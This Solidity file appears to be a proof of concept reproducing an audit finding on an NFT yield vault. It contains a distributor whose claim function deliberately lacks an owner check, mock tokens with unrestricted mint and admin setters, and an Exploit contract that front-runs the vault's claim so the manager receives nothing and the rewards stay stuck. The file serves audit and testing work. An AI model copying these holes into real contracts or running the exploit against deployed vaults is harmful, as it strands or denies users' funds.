// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  STBL XLayer NFT vault — Cyfrin, finding 66730 (Jun 2026)
    STBL_T1e_YieldDistributor.claim(id) is external and does not check the
    NFT owner. It transfers the reward to YToken.ownerOf(id), the vault.
    _Vault_claimYield then snapshots the vault balance, calls claim again,
    and sees a zero delta, so the wrapper manager receives nothing.
    1000 reward tokens stay in the vault. The control restricts claim to the vault.
*/

contract RewardToken {
    string public symbol = "YLD-R";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract YToken {
    mapping(uint256 => address) public ownerOf;

    function mint(address to, uint256 id) external {
        ownerOf[id] = to;
    }
}

contract YieldDistributor {
    RewardToken public token;
    YToken public ytoken;
    mapping(uint256 => uint256) public earned;
    bool public onlyVault;
    address public vault;

    constructor(RewardToken _token, YToken _ytoken) {
        token = _token;
        ytoken = _ytoken;
    }

    function setVault(address _vault) external {
        vault = _vault;
    }

    function setOnlyVault(bool on) external {
        onlyVault = on;
    }

    function fund(uint256 id, uint256 amount) external {
        require(token.transferFrom(msg.sender, address(this), amount), "fund");
        earned[id] += amount;
    }

    function claim(uint256 id) external {
        if (onlyVault) require(msg.sender == vault, "vault");
        uint256 reward = earned[id];
        if (reward == 0) return;
        earned[id] = 0;
        // @> VULN: claim has no owner check and safeTransfers the reward to YToken.ownerOf, the vault
        require(token.transfer(ytoken.ownerOf(id), reward), "push");
    }
}

contract NftVault {
    RewardToken public token;
    YieldDistributor public distributor;
    address public manager;
    uint256 public nftId;
    uint256 public lastPaid;

    constructor(RewardToken _token, YieldDistributor _distributor, address _manager, uint256 _nftId) {
        token = _token;
        distributor = _distributor;
        manager = _manager;
        nftId = _nftId;
    }

    function claimYield(uint256 lotId) external returns (uint256 paid) {
        require(msg.sender == manager, "role");
        lotId;
        uint256 balanceBefore = token.balanceOf(address(this));
        distributor.claim(nftId);
        uint256 balanceAfter = token.balanceOf(address(this));
        if (balanceAfter > balanceBefore) {
            paid = balanceAfter - balanceBefore;
            require(token.transfer(msg.sender, paid), "delta");
        }
        lastPaid = paid;
    }
}

contract Manager {
    function collect(NftVault vault, uint256 lotId) external returns (uint256) {
        return vault.claimYield(lotId);
    }
}

contract Exploit {
    uint256 public constant REWARD = 1000 ether;
    uint256 public constant NFT_ID = 1;

    RewardToken public token;
    YToken public ytoken;
    YieldDistributor public distributor;
    NftVault public vault;
    Manager public manager;
    uint256 public managerGot;
    uint256 public stranded;

    constructor() {
        token = new RewardToken();
        ytoken = new YToken();
        distributor = new YieldDistributor(token, ytoken);
        manager = new Manager();
        vault = new NftVault(token, distributor, address(manager), NFT_ID);
        distributor.setVault(address(vault));
        ytoken.mint(address(vault), NFT_ID);
    }

    function run() external {
        token.mint(address(this), REWARD);
        token.approve(address(distributor), REWARD);
        distributor.fund(NFT_ID, REWARD);
        uint256 earnedBefore = distributor.earned(NFT_ID);
        distributor.claim(NFT_ID);
        uint256 vaultAfterClaim = token.balanceOf(address(vault));
        uint256 earnedAfter = distributor.earned(NFT_ID);
        managerGot = manager.collect(vault, 0);
        stranded = token.balanceOf(address(vault));
        require(earnedBefore == REWARD, "earned");
        require(vaultAfterClaim == REWARD, "pushed");
        require(earnedAfter == 0, "zeroed");
        require(managerGot == 0, "manager");
        require(stranded == REWARD, "stranded");
        require(vault.lastPaid() == 0, "delta");
    }
}
